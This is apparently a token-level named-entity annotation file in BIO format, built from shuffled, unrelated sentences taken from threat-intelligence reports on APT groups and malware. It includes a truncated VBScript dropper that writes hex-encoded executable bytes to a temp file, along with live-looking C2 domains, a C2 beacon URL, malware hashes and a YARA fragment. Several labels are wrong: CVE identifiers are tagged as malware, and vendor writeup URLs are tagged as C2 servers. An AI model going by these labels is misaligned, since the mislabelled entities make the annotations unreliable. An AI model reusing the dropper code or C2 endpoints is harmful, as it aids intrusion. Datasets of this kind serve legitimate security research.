fellow	O
security	O
researchers	O
at	O
CrowdStrike	O
for	O
sharing	O
hashes	O
of	O
the	O
malware	O
samples	O
analyzed	O
in	O
this	O
report	O
.	O

Targets	O
:	O
TR	O
,	O
KZ	O
,	O
BA	O
,	O
TM	O
,	O
AF	O
,	O
DE	O
,	O
LT	O
,	O
NL	O
This	O
subset	O
of	O
SPLM/CHOPSTICK	B-malware.backdoor
activity	O
leads	O
into	O
several	O
small	O
surprises	O
that	O
take	O
us	O
into	O
2018	O
,	O
to	O
be	O
discussed	O
in	O
further	O
detail	O
at	O
SAS	O
2018	O
.	O

Atomic	O
indicators	O
are	O
generally	O
weak	O
indicators	O
given	O
their	O
ease	O
of	O
modification	O
within	O
the	O
attack	O
scenario	O
and	O
should	O
only	O
be	O
used	O
as	O
preliminary	O
indicators	O
while	O
more	O
robust	O
methods	O
are	O
instituted	O
.	O

This	O
gave	O
analysts	O
two	O
more	O
suspicious	O
servers	O
to	O
study	O
,	O
and	O
added	O
considerable	O
data	O
analysis	O
.	O

'	O
ClearSky	O
'	O
www.clearskysec.com	B-url.normal

Then	O
it	O
must	O
connect	O
metasploit	O
of	O
Linux	O
.	O

The	O
register	O
will	O
point	O
to	O
the	O
encoded	O
string	O
is	O
the	O
destination	O
buffer	O
address	O
for	O
the	O
decoded	O
string	O
.	O

Once	O
dumped	O
,	O
the	O
confi	O
dential	O
information	O
gets	O
uploaded	O
to	O
the	O
command	O
and	O
control	O
server	O
at	O
a	O
later	O
time	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
code	O
that	O
generates	O
the	O
password	O
.	O

System	O
owners	O
are	O
also	O
advised	O
to	O
run	O
the	O
Yara	O
signature	O
on	O
any	O
system	O
that	O
is	O
suspected	O
to	O
have	O
been	O
targeted	O
by	O
RIS	O
actors	O
.	O

Both	O
of	O
these	O
IDS	O
signatures	O
can	O
be	O
optimized	O
further	O
to	O
factor	O
depth	O
and	O
offset	O
.	O

Compared	O
to	O
Patchwork	O
,	O
whose	O
Trojanized	O
documents	O
exploit	O
at	O
least	O
five	O
security	O
flaws	O
,	O
Confucius	O
'	O
backdoors	O
are	O
delivered	O
through	O
Office	O
files	O
exploiting	O
memory	O
corruption	O
vulnerabilities	O
CVE-2015-1641	B-malware.unknown
and	O
CVE-2017-11882	B-malware.backdoor
.	O

In	O
order	O
to	O
prevent	O
detonation	O
on	O
hosts	O
other	O
than	O
that	O
of	O
the	O
intended	O
victim	O
,	O
the	O
malware	O
author	O
has	O
purposely	O
mangled	O
the	O
first	O
two	O
bytes	O
of	O
the	O
RAT	B-malware.backdoor
Implant	O
.	O

It	O
is	O
possible	O
that	O
they	O
are	O
hacked	O
boxes	O
,	O
and	O
as	O
such	O
not	O
give	O
much	O
valid	O
information	O
.	O

McAfee	O
Network	O
Security	O
Platform	O
McAfee	O
Network	O
Security	O
Platform	O
versions	O
with	O
Artemis	O
enabled	O
(	O
6.0.x	O
)	O
provide	O
coverage	O
for	O
this	O
malware	O
.	O

As	O
such	O
,	O
we	O
counted	O
the	O
unique	O
IP	O
addresses	O
that	O
connected	O
to	O
the	O
sinkhole	O
on	O
each	O
day	O
.	O

Command	O
&	O
Control	O
Servers	O

C	O
&	O
C	O
IP	O
address	O

A	O
snippet	O
of	O
the	O
malicious	O
macro	O
's	O
code	O
,	O
marked	O
with	O
colored	O
boxes	O
to	O
show	O
the	O
different	O
functions	O

2016	O
.	O

Each	O
value	O
under	O
this	O
key	O
represents	O
a	O
separate	O
Svchost	O
group	O
and	O
appears	O
as	O
a	O
separate	O
instance	O
when	O
you	O
are	O
viewing	O
active	O
processes	O
.	O

IOPCSyncIO	O

Please	O
wait	O
..	O
<	O
script	O
language='javascript	O
'	O
>	O
document.location=	O
'	O
'	O
;	O
<	O
/script	O
>	O
<	O
HTML	O
>	O
<	O
script	O
language=vbs	O
>	O
Set	O
o=CreateObject	O
(	O
'	O
Scripting.FileSystemObject	O
'	O
)	O
Set	O
s=CreateObject	O
(	O
'	O
WScript.Shell	O
'	O
)	O
p=o.GetSpecialFolder	O
(	O
2	O
)	O
&	O
'	O
\1.exe	O
'	O
t=split	O
(	O
'	O
4D,5A,90,0,3,0,0,0,4,0,0,0	O
,	O
FF	O
,	O
FF,0,0	O
,	O
B8,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0	O
,	O
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,80,0,0,0	O
,	O
E,1F	O
,	O
BA	O
,	O
E,0	O
,	O
B4	O
,	O
9	O
,	O
CD,21	O
,	O
B8,1,4C	O
,	O
CD,21,54,68,69,73,20,70,72,6F,67,72,61,6D,20,63,61,6E,6E,6F,74,2	O
0,62,65,20,72,75,6E,20,69,6E,20,44,4F,53,20,6D,6F,64,65,2E	O
,	O
D	O
,	O
D	O
,	O
A,24,0,0,0,0,0,0	O
,	O
0,50,45,0,0,4C,1,3,0,44,20	O
,	O
B6,51,0,0,0,0,0,0,0,0	O
,	O
E0,0,2,1	O
,	O
B,1,8,0,0	O
,	O
CC,1,0,0,8,0	O
,0,0,0,0,0,3E	O
,	O
EA,1,0,0,20,0,0,0,0,0,0,0,0,40,0,0,20,0	O
,	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O
<	O
SNIP	O
>	O

The	O
email	O
address	O
used	O
to	O
register	O
this	O
domain	O
was	O
also	O
referenced	O
in	O
a	O
Chinese	O
developer	O
forum	O
,	O
but	O
nothing	O
else	O
interesting	O
was	O
discovered	O
about	O
it	O
.	O

All	O
these	O
activities	O
are	O
performed	O
via	O
the	O
'	O
mail.bg	O
'	O
web-interface	O
with	O
the	O
use	O
of	O
the	O
system	O
Wininet	O
API	O
functions	O
.	O

File	O
Name	O
:	O
netsat.exe	B-malware.infosteal
File	O
Size	O
:	O
43520	O
bytes	O
MD5	O
:	O
eb8399483b55f416e48a320d68597d72	B-hash
SHA1	O
:	O
8a7183b7ceb30517460b6ab614551ca38e915309	B-hash
PE	O
Time	O
:	O
0x5154F7F2	O
[	O
Fri	O
Mar	O
29	O
02:09:54	O
2013	O
UTC	O
]	O
Sections	O
(	O
4	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.37	O
df1790813aca1265bc475f3891957512	B-hash
.rdata	O
5.19	O
a598dca4a8fe8ee17941fa60be746d31	B-hash
.data	O
0.29	O
b3d1c1a0b1054a082c841ebd1354755f	B-hash
.rsrc	O
3.34	O
d4b9539426ff130b80e11efec7465acd	B-hash
File	O
Name	O
:	O
netui3.dll	B-malware.backdoor
File	O
Size	O
:	O
39424	O
bytes	O
MD5	O
:	O
68aed7b1f171b928913780d5b21f7617	B-hash
SHA1	O
:	O
44e711e95311b81d597a7800d96482b873cb8235	B-hash
PE	O
Time	O
:	O
0x5152AE99	O
[	O
Wed	O
Mar	O
27	O
08:32:25	O
2013	O
UTC	O
]	O
Sections	O
(	O
3	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.37	O
b2a939d2ad678201560285287e7dca1d	B-hash
.rdata	O
5.32	O
2cd54a2d2ada8650c9bd9eae69aef3ca	B-hash
.data	O
0.58	O
70a79ca0958afad5b7742641b2cff9ea	B-hash
File	O
Name	O
:	O
winmgt.dll	B-malware.backdoor
File	O
Size	O
:	O
37888	O
bytes	O
MD5	O
:	O
54e4a15a68cfbb2314d0aaad455fbfce	B-hash
SHA1	O
:	O
49531b098049ae52264ae9b398c2cf59ff5379bc	B-hash
PE	O
Time	O
:	O
0x50CAEAE4	O
[	O
Fri	O
Dec	O
14	O
09:01:24	O
2012	O
UTC	O
]	O
Sections	O
(	O
3	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.31	O
6a0f9499f4ca8e0b2e4f09b9126806e6	B-hash
.rdata	O
5.23	O
e49920b9ebad63f0d95bad505ea8fdf7	B-hash
.data	O
0.59	O
a583b2c8490a7f0fcaee2f4776e445d8	B-hash

The	O
third	O
version	O
we	O
found	O
(	O
5.1.2	O
rc1	O
)	O
reverts	O
to	O
a	O
DLL	O
file	O
type	O
but	O
retains	O
the	O
C	O
&	O
C	O
server	O
.	O

When	O
we	O
analyzed	O
ANEL	B-malware.backdoor
5.1.1	O
rc	O
,	O
encrypted	O
ANEL	B-malware.backdoor
5.1.2	O
rc1	O
was	O
downloaded	O
and	O
executed	O
.	O

(	O
November	O
13	O
,	O
2012	O
)	O
.	O

Meanwhile	O
,	O
we	O
found	O
the	O
following	O
binary	O
leading	O
attack	O
files	O
(	O
hereinafter	O
referred	O
to	O
as	O
Sample	O
A	O
)	O
were	O
used	O
in	O
similar	O
attacks	O
before	O
:	O

Urgent	O
message.doc	O

SHA-1	O
c388b693d10e2b84af52ab2c29eb9328e47c3c16	B-hash
8ad0a56e3db1e2cd730031bdcae2dbba3f7aba9c	B-hash
200.122.181.63	B-ip.unknown
Domains	O
thlsystems.for rst.cz	B-url.normal
mafra.go.kr.jeojang.ga	B-url.normal
Previous	O
Article	O
(	O
https://securingtomorrow.mcafee.com/consumer/family-safety/2018-resolution-lose-weight-tech-safety-guilt/	B-url.normal
)	O
Next	O
Article	O
(	O
https://securingtomorrow.mcafee.com/consumer/mcafee-ces-solutions-partnerships/	B-url.normal
)	O
Categories	O
:	O
McAfee	O
Labs	O
(	O
https://securingtomorrow.mcafee.com/category/mcafee-labs/	B-url.normal
)	O
Tags	O
:	O
cybersecurity	O
(	O
https://securingtomorrow.mcafee.com/tag/cybersecurity/	B-url.normal
)	O
,	O
endpoint	O
protection	O
(	O
https://securingtomorrow.mcafee.com/tag/endpoint-protection/	O
)	O
,	O
malware	O
(	O
https://securingtomorrow.mcafee.com/tag/malware/	B-url.normal
)	O

With	O
the	O
help	O
of	O
the	O
researcher	O
that	O
goes	O
online	O
with	O
the	O
Twitter	O
handle	O
Drunk	O
Binary	O
(	O
@	O
DrunkBinary	O
)	O
we	O
obtained	O
a	O
collection	O
of	O
samples	O
to	O
compare	O
with	O
the	O
one	O
we	O
were	O
in	O
possession	O
to	O
discover	O
if	O
we	O
were	O
in	O
presence	O
of	O
a	O
new	O
variant	O
of	O
the	O
infamous	O
APT28	B-malware.backdoor
backdoor	O
tracked	O
as	O
X-Agent	B-malware.backdoor
.	O

Figure	O
1	O
.	O

תויאבצ	O
תוינכות	O
תוינכות	O
כ'בש	O
Intelligence	O
meeting	O
protocol	O
passwords	O
passwords	O
the	O
passwords	O
the	O
passwords	O
the	O
passwords	O
Database	O
document	O
SITA	O
(	O
www.sita.aero	O
)	O
military	O
defense	O
or	O
security	O
related	O
the	O
emails	O
intelligence	O
military	O
plans	O
plans	O
Shabak	O
(	O
Israel	O
Security	O
Agency	O
)	O

The	O
PCC_CMD	O
:	O
:ProcessPacket	O
function	O
works	O
as	O
a	O
stub	O
function	O
that	O
merely	O
passes	O
the	O
packet	O
's	O
payload	O
data	O
(	O
pkt	O
)	O
data	O
to	O
PCC_CMD	O
:	O
:ProcessPacketEx	O
while	O
ignoring	O

dequeue	O
:	O
]	O

Msfte.dll	B-malware.backdoor
is	O
the	O
final	O
backdoor	O
program	O
whose	O
export	O
is	O
disguised	O
as	O
zlib	O
.	O

Their	O
bootstrap	O
logic	O
is	O
also	O
hidden	O
in	O
plain	O
sight	O
,	O
such	O
that	O
it	O
might	O
be	O
easy	O
to	O
miss	O
.	O

rule	O
apt_win32_dll_rat_1a53b0cp32e46g0qio7	O
in	O
the	O
beacon	O
word	O
ptr	O
[	O
ebp+eax*2+var_5C	O
]	O
,	O
14h	O
$	O
=	O
{	O
66	O
[	O
4-7	O
]	O
14	O
40	O
83	O
f8	O
14	O
7c	O
?	O
?	O
}	O

일부	O
변형은	O
Themida	B-malware.backdoor
등의	O
패커로	O
패킹했다	O
.	O

Completely	O
decrypted	O
and	O
de-obfuscated	O
network	O
traffic	O
from	O
this	O
malware	O
will	O
look	O
like	O
the	O
following	O
(	O
replace	O
COMPUTER_NAME	O
with	O
actual	O
name	O
of	O
computer	O
,	O
host	O
header	O
remove	O
brackets	O
)	O
:	O
In	O
the	O
above	O
POST	O
request	O
,	O
the	O
string	O
'	O
1a53b0cp32e46g0qio9	O
'	O
is	O
staticly	O
embedded	O
within	O
the	O
binary	O
,	O
not	O
changing	O
between	O
C2	O
beacons	O
,	O
and	O
the	O
negative	O
value	O
'	O
-1289335108	O
'	O
refers	O
to	O
the	O
signed	O
integer	O
representation	O
of	O
the	O
Victim	O
's	O
Volume	O
Serial	O
Number	O
without	O
the	O
dash	O
(	O
'	O
-	O
'	O
)	O
.	O

For	O
further	O
details	O
on	O
the	O
configuration	O
information	O
,	O
please	O
refer	O
to	O
Appendix	O
B	O
.	O

Customers	O
of	O
McAfee	O
ePolicy	O
Orchastrator	O
,	O
integrated	O
with	O
Digital	O
DNA	O
,	O
can	O
detect	O
emerging	O
advanced	O
persistent	O
threats	O
.	O

Serial	O
Number	O
:	O
3F	O
FC	O
EB	O
A8	O
3F	O
E0	O
0F	O
EF	O
97	O
F6	O
3C	O
D9	O
2E	O
77	O
EB	O
B9	O
Why	O
the	O
attackers	O
chose	O
to	O
use	O
this	O
expired	O
certificate	O
to	O
sign	O
their	O
malware	O
samples	O
is	O
unknown	O
.	O

So	O
in	O
order	O
to	O
develop	O
a	O
tracker	O
that	O
impersonates	O
a	O
DarkComet	B-malware.backdoor
bot	O
so	O
as	O
to	O
snoop	O
on	O
DDoS	O
attacks	O
,	O
we	O
need	O
to	O
reverse	O
the	O
malware	O
's	O
crypto	O
system	O
and	O
write	O
decryption	O
and	O
encryption	O
routines	O
in	O
Python	O
.	O

In	O
a	O
change	O
from	O
previous	O
compilations	O
,	O
the	O
module	O
was	O
structured	O
and	O
used	O
to	O
inject	O
remote	O
shell	O
,	O
keylogger	B-malware.infosteal
,	O
and	O
filesystem	O
add-ons	O
into	O
processes	O
running	O
on	O
victim	O
systems	O
and	O
maintaining	O
functionality	O
that	O
was	O
originally	O
present	O
within	O
the	O
main	O
module	O
.	O

The	O
Win32/Filecoder.AESNI.C	O
ransomware	O
had	O
a	O
spreading	O
mechanism	O
that	O
allowed	O
it	O
to	O
perform	O
lateral	O
movement	O
automatically	O
,	O
inside	O
a	O
compromised	O
company	O
LAN	O
.	O

Web	B-malware.ransom
Shell	I-malware.ransom
Payload	O
MD5	O
Hash	O

Once	O
the	O
malware	O
is	O
executed	O
it	O
attempts	O
to	O
spread	O
using	O
the	O
infamous	O
EternalBlue	B-malware.unknown
exploit	O
,	O
leveraging	O
the	O
DoublePulsar	O
kernel-mode	O
backdoor	O
.	O

First	O
of	O
all	O
,	O
Powershell	O
will	O
fuzzy	O
match	O
incoming	O
parameter	O
names	O
,	O
and	O
it	O
is	O
case-insensitive	O
.	O

To	O
date	O
,	O
we	O
have	O
observed	O
more	O
than	O
two	O
dozen	O
victims	O
for	O
these	O
attacks	O
.	O

They	O
do	O
not	O
check	O
files	O
directly	O
either	O
,	O
instead	O
,	O
checking	O
for	O
the	O
presence	O
of	O
a	O
list	O
of	O
folder	O
names	O
:	O
In	O
this	O
case	O
,	O
rather	O
than	O
determining	O
what	O
security	O
software	O
is	O
present	O
,	O
this	O
check	O
would	O
mainly	O
be	O
useful	O
in	O
assisting	O
the	O
attacker	O
with	O
identifying	O
the	O
victim	O
's	O
operating	O
system	O
.	O

theme0.xml	O
is	O
extracted	O
to	O
/tmp/system/word/theme/syslogd	O
before	O
it	O
's	O
executed	O
.	O

Email	O
Address	O
*	O
Country	O
*	O
--	O
Please	O
Select-In	O
this	O
new	O
,	O
aggressive	O
campaign	O
we	O
see	O
a	O
return	O
of	O
the	O
Bankshot	O
implant	O
,	O
which	O
last	O
appeared	O
in	O
2017	O
.	O

It	O
is	O
likely	O
that	O
the	O
user	O
is	O
advised	O
that	O
the	O
certificate	O
must	O
be	O
installed	O
to	O
allow	O
enrollment	O
.	O

C2	O
Command	O
Purpose	O
reboot	O
shutdown	O
clean	O
screenshot	O
upload	O
excel	O
outlook	O
risk	O
Reboot	O
the	O
system	O
using	O
shutdown	O
command	O
Shut	O
down	O
the	O
system	O
using	O
shutdown	O
command	O
Wipe	O
the	O
Drives	O
,	O
C	O
:	O
\	O
,	O
D	O
:	O
\	O
,	O
E	O
:	O
\	O
,	O
F	O
:	O
\	O
Take	O
a	O
screenshot	O
of	O
the	O
System	O
Encrypt	O
and	O
upload	O
the	O
information	O
from	O
the	O
system	O
Leverage	O
Excel.Application	O
COM	O
object	O
for	O
code	O
execution	O
Leverage	O
Outlook.Application	O
COM	O
object	O
for	O
code	O
execution	O
Leverage	O
DCOM	O
object	O
for	O
code	O
execution	O
This	O
activity	O
shows	O
us	O
that	O
TEMP.Zagros	O
stays	O
up-to-date	O
with	O
the	O
latest	O
code	O
execution	O
and	O
persistence	O
mechanism	O
techniques	O
,	O
and	O
that	O
they	O
can	O
quickly	O
leverage	O
these	O
techniques	O
to	O
update	O
their	O
malware	O
.	O

http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf	O
Trend	O
Micro	O
Incorporated	O
.	O

Tencent	B-malware.drop
QQ	I-malware.drop
Memory	O
Reading	O

Threat	O
Type	O

cd675977bf235eac49db60f6572be0d4051b9c07	B-hash

World	O
Anti-Doping	O
Agency	O
.	O

They	O
have	O
affected	O
organizations	O
all	O
over	O
the	O
world	O
.	O

It	O
may	O
have	O
been	O
implemented	O
for	O
the	O
purpose	O
of	O
wasting	O
time	O
.	O

?	O
?	O

The	O
syntax	O
to	O
define	O
scheduled	O
tasks	O
is	O
similar	O
to	O
the	O
one	O
used	O
by	O
the	O
cron	O
Unix	O
command	O
.	O

This	O
attack	O
used	O
malware	O
with	O
a	O
much	O
higher	O
level	O
of	O
sophistication	O
than	O
is	O
necessary	O
to	O
launch	O
a	O
trivial	O
distributed	O
denial	O
of	O
service	O
(	O
DDoS	O
)	O
attack	O
.	O

Of	O
particular	O
interest	O
is	O
the	O
encrypted	O
NETDATA	O
resource	O
,	O
which	O
holds	O
the	O
C	O
&	O
C	O
hostname	O
and	O
port	O
.	O

Questions	O
have	O
been	O
raised	O
since	O
Le	O
Monde	O
published	O
an	O
article	O
on	O
Babar	B-malware.drop
in	O
2014	O
and	O
were	O
recently	O
fuelled	O
by	O
a	O
leaked	O
government	O
presentation	O
found	O
among	O
a	O
stash	O
of	O
documents	O
published	O
in	O
January	O
by	O
Spiegel.The	O
leaked	O
document	O
was	O
authored	O
by	O
the	O
Communications	O
Security	O
Establishment	O
Canada	O
(	O
CSEC	O
)	O
and	O
reports	O
about	O
a	O
potential	O
nation	O
state	O
attack	O
involving	O
malware	O
named	O
Babar	B-malware.drop
.	O

Moreover	O
,	O
older	O
versions	O
of	O
the	O
BE	O
destructive	O
module	O
have	O
even	O
longer	O
lists	O
.	O

1-The	O
name	O
30.apk	B-malware.backdoor
is	O
an	O
abbreviated	O
variant	O
of	O
Поправки-Д	O
30	O
which	O
translates	O
to	O
Correction-D30	O
.	O

Kelly	O
Bissell	O
Joshua	O
Ray	O
Uwe	O
Kissman	O
Ryan	O
LaSalle	O
Gareth	O
Russell	O

We	O
believe	O
this	O
is	O
mainly	O
used	O
to	O
intercept	O
credentials	O
from	O
other	O
browsers	O
,	O
specifically	O
Google	O
Chrome	O
:	O
The	O
backdoor	O
tries	O
to	O
contact	O
the	O
following	O
domains	O
until	O
it	O
gets	O
a	O
response	O
from	O
an	O
active	O
one	O
:	O
silence.phdns01.com	B-url.unknown
cpnet.phmail.us	B-url.unknown
imlang.phmail.org	B-url.unknown
The	O
Indian	O
backdoor	O
tries	O
to	O
contact	O
the	O
following	O
domains	O
instead	O
:	O
cresy.zyns.com	B-url.unknown
preter.epac.to	B-url.unknown
backto.ddns.name	B-url.unknown
In	O
the	O
first	O
set	O
of	O
domains	O
they	O
are	O
either	O
registered	O
with	O
Whois	O
proxy	O
services	O
or	O
with	O
fake	O
identities	O
.	O

Exploit	O
Document	O
MD5	O
:	O

compname=	O
<	O
COMPUTERNAME	O
>	O
and	O
http[:]//199.91.173[.]45/is_array.php?compname=	B-ip.unknown
<	O
COMPUTERNAME	O
>	O
.	O

The	O
DLL	O
when	O
loaded	O
in	O
the	O
context	O
of	O
an	O
application	O
seeks	O
to	O
invade	O
a	O
maximum	O
of	O
two	O
more	O
victim	O
processes	O
.	O

Then	O
,	O
they	O
would	O
compromise	O
the	O
legitimate	O
company	O
software	O
distribution	O
sites	O
and	O
replace	O
the	O
legitimate	O
installers	O
with	O
the	O
Crouching	B-malware.drop
Yeti	I-malware.drop
trojanized	O
versions	O
.	O

In	O
order	O
to	O
firewall	O
tunnels	O
from	O
each	O
other	O
over	O
the	O
backbone	O
of	O
the	O
server	O
variant	O
's	O
command	O
channel	O
,	O
each	O
tunnel	O
is	O
assigned	O
a	O
specific	O
channel	O
identifier	O
.	O

Fancy	O
Bears	O
'	O
HT	O
(	O
fancybears	O
)	O
.	O

Decoy	O
Document	O
Last	O
Modified	O
:	O

168.235.86.156	B-ip.unknown
United	O
States	O
Macon	O
Ramnode	O
Llc	O

The	O
variant	O
{	O
92BA1818-0119-4F79-874E-E3BF79C355B8	O
}	O
.dll	O
checks	O
whether	O
rastlsc.exe	O

Email	O
Subscription	O
Your	O
email	O
here	O

Although	O
a	O
regional	O
actor	O
,	O
the	O
group	O
has	O
followed	O
two	O
trends	O
seen	O
globally	O
among	O
targeted	O
attack	O
groups	O
.	O

)	O
use_proxy	O
=	O
0	O
;	O
buffer	O
=	O
3	O
;	O
>	O
hInternetOpen	O
=	O
InternetOpenA	O
(	O
'	O
Mozilla	O
/4.0	O
'	O
,	O
0	O
,	O
0	O
,	O
0	O
,	O
0	O
)	O
;	O
(	O
use_proxy	O
)	O
success_setoption	O
=	O
InternetSetOptionA	O
(	O
>	O
hInternetOpen	O
,	O
INTERNET_OPTION_PROXY	O
,	O
&	O
buffer	O
,	O
12	O
)	O
;	O
!	O

Infostealer.Rodagose	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-120814-2005-99	B-url.cncsvr
)	O
Trojan.Rodagose!g1	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121010-5835-99	B-url.cncsvr
)	O
Trojan.Rodagose!g2	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2017-102416-2407-99	B-url.cncsvr
)	O
Trojan.MDropper	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2005-031911-0600-99	B-url.cncsvr
)	O

improving	O
Minerva	O
-Do	O
n't	O
chase	O
,	O
Prevent	O
!	O

In	O
this	O
paper	O
we	O
take	O
an	O
in-depth	O
look	O
of	O
the	O
malware	O
by	O
examining	O
the	O
attack	O
vectors	O
used	O
,	O
and	O
later	O
discuss	O
whether	O
the	O
claims	O
in	O
the	O
media	O
are	O
warranted	O
.	O

·	O
cache.txt	O
·	O
cache.txt.cfg	O
The	O
second	O
command	O
contains	O
commands	O
for	O
the	O
Command	O
Prompt	O
(	O
cmd.exe	O
)	O
.	O

This	O
allows	O
the	O
attackers	O
to	O
know	O
which	O
programs	O
are	O
running	O
on	O
the	O
system	O
or	O
if	O
any	O
analysis	O
tools	O
are	O
used	O
to	O
inspect	O
the	O
malware	O
.	O

Pokemon-PC.zip	O
(	O
40303cd6abe7004659ca3447767e4eb7	B-hash
)	O
contained	O
Pokemon-PC.exe	O
(	O
e45119a72677ed15ee0f04ef936a9803	B-hash
)	O
,	O
which	O
at	O
run	O
time	O
drops	O
monitar.exe	O
(	O
d3e0b129bad263e6c0dcb1a9da55978b	B-hash
)	O
:	O
The	O
attackers	O
also	O
distributed	O
a	O
malicious	O
app	O
for	O
Android	O
devices	O
–	O
pokemon.apk	O
(	O
3137448e0cb7ad83c433a27b6dbfb090	B-hash
)	O
.	O

Determining	O
the	O
activity	O
of	O
targeted	O
threat	O
actors	O
is	O
difficult	O
.	O

It	O
can	O
be	O
assumed	O
with	O
some	O
degree	O
of	O
certainty	O
that	O
the	O
group	O
operates	O
in	O
the	O
interests	O
of	O
or	O
takes	O
orders	O
from	O
customers	O
that	O
are	O
external	O
to	O
it	O
,	O
performing	O
initial	O
data	O
collection	O
,	O
the	O
theft	O
of	O
authentication	O
data	O
and	O
gaining	O
persistence	O
on	O
resources	O
that	O
are	O
suitable	O
for	O
the	O
attack	O
's	O
further	O
development	O
.	O

First	O
Seen	O
:	O

C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DB	O
to	O
a	O
file	O
named	O
according	O
to	O
the	O
following	O
format	O
:	O
'	O
<	O
system	O
time	O
>	O
_	O
<	O
account	O
at	O
Bulgarian	O
email	O
server	O
>	O
.txt	O
'	O
,	O
for	O
example	O
,	O
'	O
08191757_beautifl@mail.bg.txt	O
'	O
.	O

The	O
second	O
component	O
,	O
Deep	O
Discovery	O
Advisor	O
,	O
provides	O
sandbox	O
analysis	O
of	O
known	O
and	O
unknown	O
threats	O
that	O
augments	O
the	O
capabilities	O
of	O
existing	O
products	O
like	O
endpoint	O
solution	O
and	O
email/web	O
gateways	O
.	O

Yet	O
,	O
malware	O
represents	O
only	O
the	O
tip	O
of	O
the	O
spear	O
.	O

The	O
malware	O
communicates	O
with	O
a	O
FinSpy	B-malware.backdoor
Command	O
&	O
Control	O
server	O
in	O
Ethiopia	O
,	O
which	O
was	O
first	O
identified	O
by	O
Rapid7	O
in	O
August	O
2012	O
.	O

Win.Trojan.ZxShell-11	B-malware.backdoor
Win.Trojan.ZxShell-12	B-malware.backdoor
Win.Trojan.ZxShell-13	B-malware.backdoor
Win.Trojan.ZxShell-14	B-malware.backdoor
Win.Trojan.ZxShell-15	B-malware.backdoor
Win.Trojan.ZxShell-16	B-malware.backdoor
Win.Trojan.ZxShell-17	B-malware.backdoor
Win.Trojan.ZxShell-18	B-malware.backdoor
Win.Trojan.ZxShell-19	B-malware.backdoor
Win.Trojan.ZxShell-20	B-malware.backdoor
Win.Trojan.ZxShell-21	B-malware.backdoor
Win.Trojan.ZxShell-22	B-malware.backdoor
Win.Trojan.ZxShell-23	B-malware.backdoor
Win.Trojan.ZxShell-24	B-malware.backdoor
Win.Trojan.ZxShell-25	B-malware.backdoor
Win.Trojan.ZxShell-26	B-malware.backdoor
These	O
signatures	O
are	O
available	O
within	O
the	O
ClamAV	O
database	O
.	O

While	O
actors	O
from	O
China	O
,	O
Iran	O
,	O
Russia	O
,	O
and	O
North	O
Korea	O
remain	O
the	O
most	O
active	O
cyber	O
espionage	O
threats	O
tracked	O
and	O
responded	O
to	O
by	O
FireEye	O
,	O
APT32	B-malware.infosteal
reflects	O
a	O
growing	O
host	O
of	O
new	O
countries	O
that	O
have	O
adopted	O
this	O
dynamic	O
capability	O
.	O

T	O
he	O
reasons	O
for	O
this	O
are	O
not	O
very	O
clear	O
:	O
typically	O
,	O
Chinese-speaking	O
actors	O
do	O
n't	O
bother	O
disguising	O
their	O
campaigns	O
.	O

This	O
behavior	O
is	O
very	O
unusual	O
for	O
a	O
document-stealing	O
component	O
and	O
we	O
do	O
not	O
see	O
it	O
in	O
other	O
malicious	O
toolkits	O
.	O

With	O
the	O
application	O
of	O
commercial	O
attack	O
platform	O
,	O
the	O
attackers	O
saved	O
the	O
cost	O
of	O
an	O
attack	O
,	O
also	O
the	O
vulnerability	O
built	O
joint	O
function	O
provided	O
by	O
relevant	O
attack	O
platform	O
make	O
the	O
attackers	O
easy	O
to	O
do	O
injection	O
.	O

Agent.RUI	O

The	O
response	O
is	O
usually	O
an	O
HTML	O
document	O
and	O
the	O
commands	O
are	O
Base64-encoded	O
strings	O
enclosed	O
in	O
<	O
div	O
>	O
/	O
<	O
/div	O
>	O

(	O
/BLOGS/THREAT-INTELLIGENCE	O
)	O

Once	O
the	O
script	O
fi	O
nishes	O
profi	O
ling	O
the	O
infected	O
device	O
,	O
it	O
starts	O
uploading	O
confi	O
dential	O
information	O
,	O
such	O
as	O
passwords	O
.	O

The	O
server	O
variant	O
utilizes	O
a	O
device	O
driver	O
in	O
order	O
to	O
hook	O
into	O
the	O
Windows	O
firewall	O
by	O
either	O
using	O
largely	O
undocumented	O
Windows	O
Firewall	O
hooking	O
techniques	O
found	O
in	O
Windows	O
XP	O
and	O
older	O
or	O
by	O
using	O
the	O
documented	O
Windows	O
Filtering	O
Platform	O
found	O
in	O
Windows	O
Vista	O
and	O
later	O
.	O

The	O
malware	O
used	O
in	O
a	O
DUBNIUM	B-malware.drop
attack	O
is	O
committed	O
to	O
disguising	O
itself	O
as	O
Secure	O
Shell	O
(	O
SSH	O
)	O
tool	O
.	O

DPHK	O
is	O
a	O
pro-democracy	O
political	O
party	O
in	O
Hong	O
Kong	O
.	O

Disk	O
space	O
information	O
for	O
all	O
available	O
logical	O
drives	O
.	O

One	O
of	O
the	O
command	O
and	O
control	O
servers	O
used	O
by	O
a	O
variant	O
of	O
this	O
implant	O
is	O
aptly	O
named	O
'	O
ct.datangcun[.]com	O
'	O
.	O

It	O
uses	O
a	O
legitimate	O
Microsoft	O
binary	O
in	O
order	O
to	O
execute	O
itself	O
with	O
administrator	O
permissions	O
.	O

It	O
definitely	O
looks	O
like	O
a	O
great	O
candidate	O
for	O
the	O
decryption	O
operation	O
.	O

intelligence	O
.	O

The	O
dropped	O
file	O
was	O
analyzed	O
in	O
an	O
isolated	O
environment	O
(	O
without	O
actually	O
allowing	O
it	O
to	O
connect	O
to	O
the	O
c2	O
server	O
)	O
.	O

The	O
group	O
is	O
using	O
new	O
types	O
of	O
lure	O
documents	O
in	O
its	O
spear-phishing	O
campaigns	O
and	O
its	O
malware	O
has	O
expanded	O
to	O
use	O
new	O
types	O
of	O
plugins	O
.	O

We	O
